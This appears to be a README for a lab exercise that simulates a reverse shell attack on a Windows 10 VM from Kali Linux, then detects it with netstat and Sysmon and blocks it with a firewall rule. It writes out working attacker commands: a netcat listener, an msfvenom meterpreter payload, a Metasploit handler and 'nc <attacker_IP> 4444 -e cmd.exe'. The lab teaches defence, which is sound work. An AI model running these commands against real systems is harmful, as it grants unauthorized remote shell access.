# 🧪 Reverse Shell Attack & Detection Lab

## 🎯 Project Overview
This project simulates a **reverse shell attack** in a controlled environment using **Kali Linux (attacker)** and a **Windows 10 VM (victim)**. The goal is to understand how attackers establish unauthorized shell access, and how defenders can **detect, analyze, and mitigate** the threat using tools like **Sysmon, netstat, and Windows Firewall**.

---

## ⚙️ Lab Setup

### Requirements
- **VirtualBox or VMware** for virtualization  
- **Kali Linux VM (Attacker)** → [Download Kali](https://www.kali.org/get-kali/)  
- **Windows 10 VM (Victim)** → [Download Windows 10 Evaluation](https://www.microsoft.com/en-us/evalcenter/evaluate-windows-10-enterprise)  
- **Networking:** Host-only Adapter or NAT mode to enable attacker–victim communication  

---

## 🔴 Attacker Steps (Kali Linux)

1. **Start Netcat Listener**
   ```bash
   nc -nlvp 4444
   ```

2. **Generate Payload with Metasploit (Optional)**
   ```bash
   msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe > shell.exe
   ```

3. **Transfer Payload to Victim**
   - Shared folder  
   - USB  
   - Python web server (`python3 -m http.server`)

4. **Start Metasploit Handler**
   ```bash
   msfconsole
   use exploit/multi/handler
   set PAYLOAD windows/meterpreter/reverse_tcp
   set LHOST <Kali_IP>
   set LPORT 4444
   run
   ```

---

## 🔵 Victim Steps (Windows 10)

1. **Execute Payload / Netcat Command**
   ```cmd
   nc <attacker_IP> 4444 -e cmd.exe
   ```

2. **Detect Suspicious Connection with Netstat**
   ```cmd
   netstat -ano | findstr :4444
   ```

3. **Install & Use Sysmon for Logging**
   ```cmd
   sysmon -accepteula -i
   ```
   - Event ID 1 → Process creation (`cmd.exe`)  
   - Event ID 3 → Network connection (reverse shell)

4. **Check Active Processes**
   ```cmd
   tasklist | findstr "cmd"
   ```

---

## 🛡️ Defensive Mitigation

1. **Block Reverse Shell via Windows Firewall**
   ```cmd
   netsh advfirewall firewall add rule name="Block Reverse Shell" dir=out action=block protocol=TCP remoteport=4444
   ```

2. **Optional:** Run Antivirus or Windows Defender to quarantine the payload (`shell.exe`).

---

## 📊 Outcomes

- Simulated reverse shell attack with **Netcat & Metasploit**.  
- Detected activity using **Sysmon logs, netstat, and process monitoring**.  
- Mitigated threat by **blocking outbound reverse shell traffic** with Windows Firewall.  
- Documented entire **red team vs blue team workflow** with logs and screenshots.  

---


